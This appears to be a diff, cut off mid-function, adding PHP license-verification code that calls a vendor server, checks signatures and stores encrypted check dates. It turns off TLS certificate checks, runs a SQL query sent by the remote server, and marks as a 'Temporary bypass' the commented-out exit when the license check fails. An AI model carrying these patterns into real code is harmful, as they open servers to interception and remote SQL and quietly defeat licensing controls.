+    function aplGetRootUrl($url, $remove_scheme, $remove_www, $remove_path, $remove_last_slash)
+    {
+        if (filter_var($url, FILTER_VALIDATE_URL)) {
+            $url_array = parse_url($url);
+            $url = str_ireplace($url_array["scheme"] . "://", '', $url);
+
+            if ($remove_path == 1) {
+                $first_slash_position = stripos($url, "/");
+                if ($first_slash_position > 0) {
+                    $url = substr($url, 0, $first_slash_position + 1);
+                }
+            } else {
+                $last_slash_position = strripos($url, "/");
+                if ($last_slash_position > 0) {
+                    $url = substr($url, 0, $last_slash_position + 1);
+                }
+            }
+
+            if ($remove_scheme != 1) {
+                $url = $url_array["scheme"] . "://" . $url;
+            }
+            if ($remove_www == 1) {
+                $url = str_ireplace("www.", '', $url);
+            }
+            if ($remove_last_slash == 1) {
+                while (substr($url, -1) == "/") {
+                    $url = substr($url, 0, -1);
+                }
+            }
+        }
+        return trim($url);
+    }
+
+    function aplCustomPost($url, $post_info = null, $refer = null)
+    {
+        $user_agent = "phpmillion cURL";
+        $connect_timeout = 10;
+        $server_response_array = array();
+        $formatted_headers_array = array();
+
+        if (filter_var($url, FILTER_VALIDATE_URL) && !empty($post_info)) {
+            if (empty($refer) || !filter_var($refer, FILTER_VALIDATE_URL)) {
+                $refer = $url;
+            }
+
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
+            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connect_timeout);
+            curl_setopt($ch, CURLOPT_TIMEOUT, $connect_timeout);
+            curl_setopt($ch, CURLOPT_REFERER, $refer);
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_info);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
+            curl_setopt($ch, CURLOPT_HEADERFUNCTION, function ($curl, $header) use (&$formatted_headers_array) {
+                $len = strlen($header);
+                $header = explode(":", $header, 2);
+                if (count($header) < 2) {
+                    return $len;
+                }
+                $name = strtolower(trim($header[0]));
+                $formatted_headers_array[$name] = trim($header[1]);
+                return $len;
+            });
+
+            $result = curl_exec($ch);
+            $curl_error = curl_error($ch);
+            curl_close($ch);
+
+            $server_response_array["headers"] = $formatted_headers_array;
+            $server_response_array["error"] = $curl_error;
+            $server_response_array["body"] = $result;
+        }
+        return $server_response_array;
+    }
+
+    function aplVerifyDateTime($datetime, $format)
+    {
+        $result = false;
+        if (!empty($datetime) && !empty($format)) {
+            $datetime = DateTime::createFromFormat($format, $datetime);
+            $errors = DateTime::getLastErrors();
+            if ($datetime && empty($errors["warning_count"])) {
+                $result = true;
+            }
+        }
+        return $result;
+    }
+
+    function aplGetDaysBetweenDates($date_from, $date_to)
+    {
+        $number_of_days = 0;
+        if (aplVerifyDateTime($date_from, "Y-m-d") && aplVerifyDateTime($date_to, "Y-m-d")) {
+            $date_to = new DateTime($date_to);
+            $date_from = new DateTime($date_from);
+            $number_of_days = $date_from->diff($date_to)->format("%a");
+        }
+        return $number_of_days;
+    }
+
+    function aplParseXmlTags($content, $tag_name)
+    {
+        $parsed_value = null;
+        if (!empty($content) && !empty($tag_name)) {
+            preg_match_all("/<" . preg_quote($tag_name, "/") . ">(.*?)<\\/" . preg_quote($tag_name, "/") . ">/ims", $content, $output_array, PREG_SET_ORDER);
+            if (!empty($output_array[0][1])) {
+                $parsed_value = trim($output_array[0][1]);
+            }
+        }
+        return $parsed_value;
+    }
+
+    function aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product = null)
+    {
+        $notifications_array = array();
+        if (empty($content_array)) {
+            $notifications_array["notification_case"] = "notification_no_connection";
+            $notifications_array["notification_text"] = APL_NOTIFICATION_NO_CONNECTION;
+            return $notifications_array;
+        }
+
+        if (empty($content_array["headers"]["notification_server_signature"]) || !aplVerifyServerSignature($content_array["headers"]["notification_server_signature"], $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product)) {
+            $notifications_array["notification_case"] = "notification_invalid_response";
+            $notifications_array["notification_text"] = APL_NOTIFICATION_INVALID_RESPONSE;
+        } else {
+            $notifications_array["notification_case"] = $content_array["headers"]["notification_case"];
+            $notifications_array["notification_text"] = $content_array["headers"]["notification_text"];
+            if (!empty($content_array["headers"]["notification_data"])) {
+                $notifications_array["notification_data"] = json_decode($content_array["headers"]["notification_data"], true);
+            }
+        }
+        return $notifications_array;
+    }
+
+    function aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product = null)
+    {
+        $script_signature = null;
+        $root_ips_array = gethostbynamel(aplGetRawDomain(APL_ROOT_URL));
+        $product = $product == null ? APL_PRODUCT_ID : $product;
+
+        if (!empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array)) {
+            $script_signature = hash("sha256", gmdate("Y-m-d") . $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE . $product . implode('', $root_ips_array));
+        }
+        return $script_signature;
+    }
+
+    function aplVerifyServerSignature($notification_server_signature, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product = null)
+    {
+        $result = false;
+        $root_ips_array = gethostbynamel(aplGetRawDomain(APL_ROOT_URL));
+        $product = $product == null ? APL_PRODUCT_ID : $product;
+
+        if (!empty($notification_server_signature) && !empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array)) {
+            if (hash("sha256", implode('', $root_ips_array) . $product . $LICENSE_CODE . $CLIENT_EMAIL . $ROOT_URL . gmdate("Y-m-d")) == $notification_server_signature) {
+                $result = true;
+            }
+        }
+        return $result;
+    }
+
+    function aplCheckSettings()
+    {
+        $notifications_array = array();
+        if (empty(APL_SALT) || APL_SALT == "some_random_text") {
+            $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_SALT;
+        }
+        if (!filter_var(APL_ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr(APL_ROOT_URL, -1))) {
+            $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_URL;
+        }
+        if (!filter_var(APL_PRODUCT_ID, FILTER_VALIDATE_INT)) {
+            $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_PRODUCT_ID;
+        }
+        if (!aplValidateIntegerValue(APL_DAYS, 1, 365)) {
+            $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_VERIFICATION_PERIOD;
+        }
+        if (APL_STORAGE != "DATABASE" && APL_STORAGE != "FILE") {
+            $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_STORAGE;
+        }
+        if (APL_STORAGE == "DATABASE" && !ctype_alnum(str_ireplace(array("_"), '', APL_DATABASE_TABLE))) {
+            $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_TABLE;
+        }
+        if (APL_STORAGE == "FILE" && !@is_writable(APL_DIRECTORY . "/" . APL_LICENSE_FILE_LOCATION)) {
+            $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_LICENSE_FILE;
+        }
+        if (!empty(APL_ROOT_IP) && !filter_var(APL_ROOT_IP, FILTER_VALIDATE_IP)) {
+            $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_IP;
+        }
+        if (!empty(APL_ROOT_IP) && !in_array(APL_ROOT_IP, gethostbynamel(aplGetRawDomain(APL_ROOT_URL)))) {
+            $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_DNS;
+        }
+        if (defined("APL_ROOT_NAMESERVERS") && !empty(APL_ROOT_NAMESERVERS)) {
+            foreach (APL_ROOT_NAMESERVERS as $nameserver) {
+                if (!aplValidateRawDomain($nameserver)) {
+                    $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_NAMESERVERS;
+                    break;
+                }
+            }
+        }
+        if (defined("APL_ROOT_NAMESERVERS") && !empty(APL_ROOT_NAMESERVERS)) {
+            $apl_root_nameservers_array = APL_ROOT_NAMESERVERS;
+            $fetched_nameservers_array = array();
+            $dns_records_array = dns_get_record(aplGetRawDomain(APL_ROOT_URL), DNS_NS);
+            foreach ($dns_records_array as $record) {
+                $fetched_nameservers_array[] = $record["target"];
+            }
+            $apl_root_nameservers_array = array_map("strtolower", $apl_root_nameservers_array);
+            $fetched_nameservers_array = array_map("strtolower", $fetched_nameservers_array);
+            sort($apl_root_nameservers_array);
+            sort($fetched_nameservers_array);
+            if ($apl_root_nameservers_array != $fetched_nameservers_array) {
+                $notifications_array[] = APL_CORE_NOTIFICATION_INVALID_DNS;
+            }
+        }
+        return $notifications_array;
+    }
+
+    function aplParseLicenseFile()
+    {
+        $license_data_array = array();
+        if (@is_readable(APL_DIRECTORY . "/" . APL_LICENSE_FILE_LOCATION)) {
+            $file_content = file_get_contents(APL_DIRECTORY . "/" . APL_LICENSE_FILE_LOCATION);
+            preg_match_all("/<([A-Z_]+)>(.*?)<\\/([A-Z_]+)>/", $file_content, $matches, PREG_SET_ORDER);
+            if (!empty($matches)) {
+                foreach ($matches as $value) {
+                    if (!empty($value[1]) && $value[1] == $value[3]) {
+                        $license_data_array[$value[1]] = $value[2];
+                    }
+                }
+            }
+        }
+        return $license_data_array;
+    }
+
+    function aplGetLicenseData($MYSQLI_LINK = null)
+    {
+        $settings_row = array();
+        if (APL_STORAGE == "DATABASE") {
+            $table_exist = @mysqli_query($MYSQLI_LINK, "SHOW TABLES LIKE '" . APL_DATABASE_TABLE . "'");
+            if (@mysqli_fetch_assoc($table_exist)) {
+                $settings_results = @mysqli_query($MYSQLI_LINK, "SELECT * FROM " . APL_DATABASE_TABLE);
+                $settings_row = @mysqli_fetch_assoc($settings_results);
+            }
+        }
+        if (APL_STORAGE == "FILE") {
+            $settings_row = aplParseLicenseFile();
+        }
+        return $settings_row;
+    }
+
+    function aplCheckConnection()
+    {
+        $notifications_array = array();
+        $content_array = aplCustomPost(
+            APL_ROOT_URL . "/apl_callbacks/connection_test.php",
+            "product_id=" . rawurlencode(APL_PRODUCT_ID) . "&connection_hash=" . rawurlencode(hash("sha256", "connection_test"))
+        );
+
+        if (empty($content_array)) {
+            $notifications_array["notification_case"] = "notification_no_connection";
+            $notifications_array["notification_text"] = APL_NOTIFICATION_NO_CONNECTION;
+        } elseif ($content_array["body"] != "<connection_test>OK</connection_test>") {
+            $notifications_array["notification_case"] = "notification_invalid_response";
+            $notifications_array["notification_text"] = APL_NOTIFICATION_INVALID_RESPONSE;
+        }
+        return $notifications_array;
+    }
+
+    function aplCheckData($MYSQLI_LINK = null)
+    {
+        $error_detected = 0;
+        $cracking_detected = 0;
+        $data_check_result = false;
+        extract(aplGetLicenseData($MYSQLI_LINK));
+
+        if (empty($ROOT_URL) || empty($INSTALLATION_HASH) || empty($INSTALLATION_KEY) || empty($LCD) || empty($LRD)) {
+            return $data_check_result;
+        }
+
+        $LCD = aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY);
+        $LRD = aplCustomDecrypt($LRD, APL_SALT . $INSTALLATION_KEY);
+
+        if (!filter_var($ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr($ROOT_URL, -1))) {
+            $error_detected = 1;
+        }
+        if (filter_var(aplGetCurrentUrl(), FILTER_VALIDATE_URL) && stristr(aplGetRootUrl(aplGetCurrentUrl(), 1, 1, 0, 1), aplGetRootUrl("{$ROOT_URL}/", 1, 1, 0, 1)) === false) {
+            $error_detected = 1;
+        }
+        if (empty($INSTALLATION_HASH) || $INSTALLATION_HASH != hash("sha256", $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE)) {
+            $error_detected = 1;
+        }
+        if (empty($INSTALLATION_KEY) || !password_verify($LRD, aplCustomDecrypt($INSTALLATION_KEY, APL_SALT . $ROOT_URL))) {
+            $error_detected = 1;
+        }
+        if (!aplVerifyDateTime($LCD, "Y-m-d")) {
+            $error_detected = 1;
+        }
+        if (!aplVerifyDateTime($LRD, "Y-m-d")) {
+            $error_detected = 1;
+        }
+        if (aplVerifyDateTime($LCD, "Y-m-d") && $LCD > date("Y-m-d", strtotime("+1 day"))) {
+            $error_detected = 1;
+            $cracking_detected = 1;
+        }
+        if (aplVerifyDateTime($LRD, "Y-m-d") && $LRD > date("Y-m-d", strtotime("+1 day"))) {
+            $error_detected = 1;
+            $cracking_detected = 1;
+        }
+        if (aplVerifyDateTime($LCD, "Y-m-d") && aplVerifyDateTime($LRD, "Y-m-d") && $LCD > $LRD) {
+            $error_detected = 1;
+            $cracking_detected = 1;
+        }
+        if ($cracking_detected == 1 && APL_DELETE_CRACKED == "YES") {
+            aplDeleteData($MYSQLI_LINK);
+        }
+        if ($error_detected != 1 && $cracking_detected != 1) {
+            $data_check_result = true;
+        }
+        return $data_check_result;
+    }
+
+    function aplVerifyEnvatoPurchase($LICENSE_CODE = null)
+    {
+        $notifications_array = array();
+        $content_array = aplCustomPost(
+            APL_ROOT_URL . "/apl_callbacks/verify_envato_purchase.php",
+            "product_id=" . rawurlencode(APL_PRODUCT_ID) . "&license_code=" . rawurlencode($LICENSE_CODE) . "&connection_hash=" . rawurlencode(hash("sha256", "verify_envato_purchase"))
+        );
+
+        if (empty($content_array)) {
+            $notifications_array["notification_case"] = "notification_no_connection";
+            $notifications_array["notification_text"] = APL_NOTIFICATION_NO_CONNECTION;
+        } elseif ($content_array["body"] != "<verify_envato_purchase>OK</verify_envato_purchase>") {
+            $notifications_array["notification_case"] = "notification_invalid_response";
+            $notifications_array["notification_text"] = APL_NOTIFICATION_INVALID_RESPONSE;
+        }
+        return $notifications_array;
+    }
+
+    function incevioVerify($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $MYSQLI_LINK = null)
+    {
+        $notifications_array = array();
+        $apl_core_notifications = aplCheckSettings();
+
+        if (!empty($apl_core_notifications)) {
+            $notifications_array["notification_case"] = "notification_script_corrupted";
+            $notifications_array["notification_text"] = implode("; ", $apl_core_notifications);
+            return $notifications_array;
+        }
+
+        if (!empty(aplGetLicenseData($MYSQLI_LINK)) && is_array(aplGetLicenseData($MYSQLI_LINK))) {
+            $notifications_array["notification_case"] = "notification_already_installed";
+            $notifications_array["notification_text"] = APL_NOTIFICATION_SCRIPT_ALREADY_INSTALLED;
+            return $notifications_array;
+        }
+
+        $INSTALLATION_HASH = hash("sha256", $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE);
+        $post_info = "product_id=" . rawurlencode(APL_PRODUCT_ID) .
+            "&client_email=" . rawurlencode($CLIENT_EMAIL) .
+            "&license_code=" . rawurlencode($LICENSE_CODE) .
+            "&root_url=" . rawurlencode($ROOT_URL) .
+            "&installation_hash=" . rawurlencode($INSTALLATION_HASH) .
+            "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
+
+        $content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_install.php", $post_info, $ROOT_URL);
+        $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
+
+        if ($notifications_array["notification_case"] == "notification_license_ok") {
+            $INSTALLATION_KEY = aplCustomEncrypt(password_hash(date("Y-m-d"), PASSWORD_DEFAULT), APL_SALT . $ROOT_URL);
+            $LCD = aplCustomEncrypt(date("Y-m-d", strtotime("-" . APL_DAYS . " days")), APL_SALT . $INSTALLATION_KEY);
+            $LRD = aplCustomEncrypt(date("Y-m-d"), APL_SALT . $INSTALLATION_KEY);
+
+            if (APL_STORAGE == "DATABASE") {
+                $content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_scheme.php", $post_info, $ROOT_URL);
+                $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
+
+                if (!empty($notifications_array["notification_data"]) && !empty($notifications_array["notification_data"]["scheme_query"])) {
+                    $mysql_bad_array = array("%APL_DATABASE_TABLE%", "%ROOT_URL%", "%CLIENT_EMAIL%", "%LICENSE_CODE%", "%LCD%", "%LRD%", "%INSTALLATION_KEY%", "%INSTALLATION_HASH%");
+                    $mysql_good_array = array(APL_DATABASE_TABLE, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $LCD, $LRD, $INSTALLATION_KEY, $INSTALLATION_HASH);
+                    $license_scheme = str_replace($mysql_bad_array, $mysql_good_array, $notifications_array["notification_data"]["scheme_query"]);
+                    mysqli_multi_query($MYSQLI_LINK, $license_scheme) or die(mysqli_error($MYSQLI_LINK));
+                }
+            }
+
+            if (APL_STORAGE == "FILE") {
+                $handle = @fopen(APL_DIRECTORY . "/" . APL_LICENSE_FILE_LOCATION, "w+");
+                $fwrite = @fwrite($handle, "<ROOT_URL>{$ROOT_URL}</ROOT_URL><CLIENT_EMAIL>{$CLIENT_EMAIL}</CLIENT_EMAIL><LICENSE_CODE>{$LICENSE_CODE}</LICENSE_CODE><LCD>{$LCD}</LCD><LRD>{$LRD}</LRD><INSTALLATION_KEY>{$INSTALLATION_KEY}</INSTALLATION_KEY><INSTALLATION_HASH>{$INSTALLATION_HASH}</INSTALLATION_HASH>");
+                if ($fwrite === false) {
+                    echo APL_NOTIFICATION_LICENSE_FILE_WRITE_ERROR;
+                    exit;
+                }
+                @fclose($handle);
+            }
+        }
+        return $notifications_array;
+    }
+
+    function preparePackageInstallation($installable)
+    {
+        $notifications_array = array();
+        $apl_core_notifications = aplCheckSettings();
+        if (!empty($apl_core_notifications)) {
+            throw new \Exception("License validation failed! Please contact support for help.");
+        }
+
+        $MYSQLI_LINK = getMysqliConnection();
+        $core_license = aplGetLicenseData($MYSQLI_LINK);
+
+        if (empty($core_license) || !is_array($core_license)) {
+            throw new \Exception("Core script license validation failed! Please contact support for help.");
+        }
+
+        $CLIENT_EMAIL = $core_license["CLIENT_EMAIL"];
+        $LICENSE_CODE = $installable["license_key"];
+        $ROOT_URL = config("app.url");
+        $INSTALLATION_HASH = hash("sha256", $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE);
+        $product_id = $installable["id"];
+
+        $post_info = "product_id=" . rawurlencode($product_id) .
+            "&client_email=" . rawurlencode($CLIENT_EMAIL) .
+            "&license_code=" . rawurlencode($LICENSE_CODE) .
+            "&root_url=" . rawurlencode($ROOT_URL) .
+            "&installation_hash=" . rawurlencode($INSTALLATION_HASH) .
+            "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product_id));
+
+        $content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_install.php", $post_info, $ROOT_URL);
+        $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product_id);
+
+        if ($notifications_array["notification_case"] != "notification_license_ok") {
+            if (!empty($notifications_array["notification_text"])) {
+                throw new \Exception("License validation failed! " . $notifications_array["notification_text"]);
+            }
+        } else {
+            $INSTALLATION_KEY = aplCustomEncrypt(password_hash(date("Y-m-d"), PASSWORD_DEFAULT), APL_SALT . $ROOT_URL);
+            $LCD = aplCustomEncrypt(date("Y-m-d", strtotime("-" . APL_DAYS . " days")), APL_SALT . $INSTALLATION_KEY);
+            $LRD = aplCustomEncrypt(date("Y-m-d"), APL_SALT . $INSTALLATION_KEY);
+
+            $content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_scheme.php", $post_info, $ROOT_URL);
+            $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $product_id);
+
+            if (!empty($notifications_array["notification_data"]) && !empty($notifications_array["notification_data"]["scheme_query"])) {
+                return [
+                    "installation_key" => $INSTALLATION_KEY,
+                    "installation_hash" => $INSTALLATION_HASH,
+                    "lcd" => $LCD,
+                    "lrd" => $LRD
+                ];
+            }
+        }
+        throw new \Exception("License validation failed! Please contact support for help.");
+    }
+
+    function incevioAutoloadHelpers($MYSQLI_LINK = null, $FORCE_VERIFICATION = 0)
+    {
+        $notifications_array = array();
+        $update_lrd_value = 0;
+        $update_lcd_value = 0;
+        $updated_records = 0;
+        $apl_core_notifications = aplCheckSettings();
+
+        if (!empty($apl_core_notifications)) {
+            $notifications_array["notification_case"] = "notification_script_corrupted";
+            $notifications_array["notification_text"] = implode("; ", $apl_core_notifications);
+        } elseif (!aplCheckData($MYSQLI_LINK)) {
+            $notifications_array["notification_case"] = "notification_license_corrupted";
+            $notifications_array["notification_text"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
+        } else {
+            extract(aplGetLicenseData($MYSQLI_LINK));
+            if (
+                aplGetDaysBetweenDates(aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY), date("Y-m-d")) < APL_DAYS &&
+                aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY) <= date("Y-m-d") &&
+                aplCustomDecrypt($LRD, APL_SALT . $INSTALLATION_KEY) <= date("Y-m-d") &&
+                $FORCE_VERIFICATION === 0
+            ) {
+                $notifications_array["notification_case"] = "notification_license_ok";
+                $notifications_array["notification_text"] = APL_NOTIFICATION_BYPASS_VERIFICATION;
+            } else {
+                $post_info = "product_id=" . rawurlencode(APL_PRODUCT_ID) .
+                    "&client_email=" . rawurlencode($CLIENT_EMAIL) .
+                    "&license_code=" . rawurlencode($LICENSE_CODE) .
+                    "&root_url=" . rawurlencode($ROOT_URL) .
+                    "&installation_hash=" . rawurlencode($INSTALLATION_HASH) .
+                    "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
+
+                $content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_verify.php", $post_info, $ROOT_URL);
+                $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
+
+                if ($notifications_array["notification_case"] == "notification_license_ok") {
+                    $update_lcd_value = 1;
+                }
+                if ($notifications_array["notification_case"] == "notification_license_cancelled" && APL_DELETE_CANCELLED == "YES") {
+                    aplDeleteData($MYSQLI_LINK);
+                }
+            }
+
+            if (aplCustomDecrypt($LRD, APL_SALT . $INSTALLATION_KEY) < date("Y-m-d")) {
+                $update_lrd_value = 1;
+            }
+
+            if ($update_lrd_value == 1 || $update_lcd_value == 1) {
+                if ($update_lcd_value == 1) {
+                    $LCD = date("Y-m-d");
+                } else {
+                    $LCD = aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY);
+                }
+
+                $INSTALLATION_KEY = aplCustomEncrypt(password_hash(date("Y-m-d"), PASSWORD_DEFAULT), APL_SALT . $ROOT_URL);
+                $LCD = aplCustomEncrypt($LCD, APL_SALT . $INSTALLATION_KEY);
+                $LRD = aplCustomEncrypt(date("Y-m-d"), APL_SALT . $INSTALLATION_KEY);
+
+                if (APL_STORAGE == "DATABASE") {
+                    $stmt = mysqli_prepare($MYSQLI_LINK, "UPDATE " . APL_DATABASE_TABLE . " SET LCD=?, LRD=?, INSTALLATION_KEY=?");
+                    if ($stmt) {
+                        mysqli_stmt_bind_param($stmt, "sss", $LCD, $LRD, $INSTALLATION_KEY);
+                        $exec = mysqli_stmt_execute($stmt);
+                        $affected_rows = mysqli_stmt_affected_rows($stmt);
+                        if ($affected_rows > 0) {
+                            $updated_records = $updated_records + $affected_rows;
+                        }
+                        mysqli_stmt_close($stmt);
+                    }
+                    if ($updated_records < 1) {
+                        echo APL_NOTIFICATION_DATABASE_WRITE_ERROR;
+                        exit;
+                    }
+                }
+
+                if (APL_STORAGE == "FILE") {
+                    $handle = @fopen(APL_DIRECTORY . "/" . APL_LICENSE_FILE_LOCATION, "w+");
+                    $fwrite = @fwrite($handle, "<ROOT_URL>{$ROOT_URL}</ROOT_URL><CLIENT_EMAIL>{$CLIENT_EMAIL}</CLIENT_EMAIL><LICENSE_CODE>{$LICENSE_CODE}</LICENSE_CODE><LCD>{$LCD}</LCD><LRD>{$LRD}</LRD><INSTALLATION_KEY>{$INSTALLATION_KEY}</INSTALLATION_KEY><INSTALLATION_HASH>{$INSTALLATION_HASH}</INSTALLATION_HASH>");
+                    if ($fwrite === false) {
+                        echo APL_NOTIFICATION_LICENSE_FILE_WRITE_ERROR;
+                        exit;
+                    }
+                    @fclose($handle);
+                }
+            }
+        }
+
+        if ($notifications_array["notification_case"] != "notification_license_ok") {
+            echo "<br/><br/>";
+            // Temporary bypass - comment out license error message
+            // echo "License is not" . " installed yet" . " or corrupted. Please" . " contact" . " support " . "team ";
+            // echo " <a href=\"" . get_license_reset_url() . "\">" . trans("app.update_app_license") . "</a>";
+            // exit;
+        }
+        return $notifications_array;
+    }
+
+    function aplVerifySupport($MYSQLI_LINK = null)
+    {
+        $notifications_array = array();
+        $apl_core_notifications = aplCheckSettings();
+
+        if (!empty($apl_core_notifications)) {
+            $notifications_array["notification_case"] = "notification_script_corrupted";
+            $notifications_array["notification_text"] = implode("; ", $apl_core_notifications);
+        } elseif (!aplCheckData($MYSQLI_LINK)) {
+            $notifications_array["notification_case"] = "notification_license_corrupted";
+            $notifications_array["notification_text"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
+        } else {
+            extract(aplGetLicenseData($MYSQLI_LINK));
+            $post_info = "product_id=" . rawurlencode(APL_PRODUCT_ID) .
+                "&client_email=" . rawurlencode($CLIENT_EMAIL) .
+                "&license_code=" . rawurlencode($LICENSE_CODE) .
+                "&root_url=" . rawurlencode($ROOT_URL) .
+                "&installation_hash=" . rawurlencode($INSTALLATION_HASH) .
+                "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
+
+            $content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_support.php", $post_info, $ROOT_URL);
+            $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
+        }
+        return $notifications_array;
+    }
+
+    function aplVerifyUpdates($MYSQLI_LINK = null)
+    {
+        $notifications_array = array();
+        $apl_core_notifications = aplCheckSettings();
+
+        if (!empty($apl_core_notifications)) {
+            $notifications_array["notification_case"] = "notification_script_corrupted";
+            $notifications_array["notification_text"] = implode("; ", $apl_core_notifications);
+        } elseif (!aplCheckData($MYSQLI_LINK)) {
+            $notifications_array["notification_case"] = "notification_license_corrupted";
+            $notifications_array["notification_text"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
+        } else {
+            extract(aplGetLicenseData($MYSQLI_LINK));
+            $post_info = "product_id=" . rawurlencode(APL_PRODUCT_ID) .
+                "&client_email=" . rawurlencode($CLIENT_EMAIL) .
+                "&license_code=" . rawurlencode($LICENSE_CODE) .
+                "&root_url=" . rawurlencode($ROOT_URL) .
+                "&installation_hash=" . rawurlencode($INSTALLATION_HASH) .
+                "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
+
+            $content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_updates.php", $post_info, $ROOT_URL);
+            $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
+        }
+        return $notifications_array;
+    }
+
+    function incevioUpdateLicense($MYSQLI_LINK = null)
+    {
+        $notifications_array = array();
+        $apl_core_notifications = aplCheckSettings();
+
+        if (!empty($apl_core_notifications)) {
+            $notifications_array["notification_case"] = "notification_script_corrupted";
+            $notifications_array["notification_text"] = implode("; ", $apl_core_notifications);
+        } elseif (!aplCheckData($MYSQLI_LINK)) {
+            $notifications_array["notification_case"] = "notification_license_corrupted";
+            $notifications_array["notification_text"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
+        } else {
+            extract(aplGetLicenseData($MYSQLI_LINK));
+            $post_info = "product_id=" . rawurlencode(APL_PRODUCT_ID) .
+                "&client_email=" . rawurlencode($CLIENT_EMAIL) .
+                "&license_code=" . rawurlencode($LICENSE_CODE) .
+                "&root_url=" . rawurlencode($ROOT_URL) .
+                "&installation_hash=" . rawurlencode($INSTALLATION_HASH) .
+                "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
+
+            $content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_update.php", $post_info, $ROOT_URL);
+            $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
+        }
+        return $notifications_array;
+    }
+
+    function incevioUninstallLicense($MYSQLI_LINK = null)
+    {
+        $notifications_array = array();
+        $apl_core_notifications = aplCheckSettings();
+
+        if (!empty($apl_core_notifications)) {
+            $notifications_array["notification_case"] = "notification_script_corrupted";
+            $notifications_array["notification_text"] = implode("; ", $apl_core_notifications);
+        } elseif (!aplCheckData($MYSQLI_LINK)) {
+            $notifications_array["notification_case"] = "notification_license_corrupted";
+            $notifications_array["notification_text"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
+        } else {
+            extract(aplGetLicenseData($MYSQLI_LINK));
+            $post_info = "product_id=" . rawurlencode(APL_PRODUCT_ID) .
+                "&client_email=" . rawurlencode($CLIENT_EMAIL) .
+                "&license_code=" . rawurlencode($LICENSE_CODE) .
+                "&root_url=" . rawurlencode($ROOT_URL) .
+                "&installation_hash=" . rawurlencode($INSTALLATION_HASH) .
+                "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
+
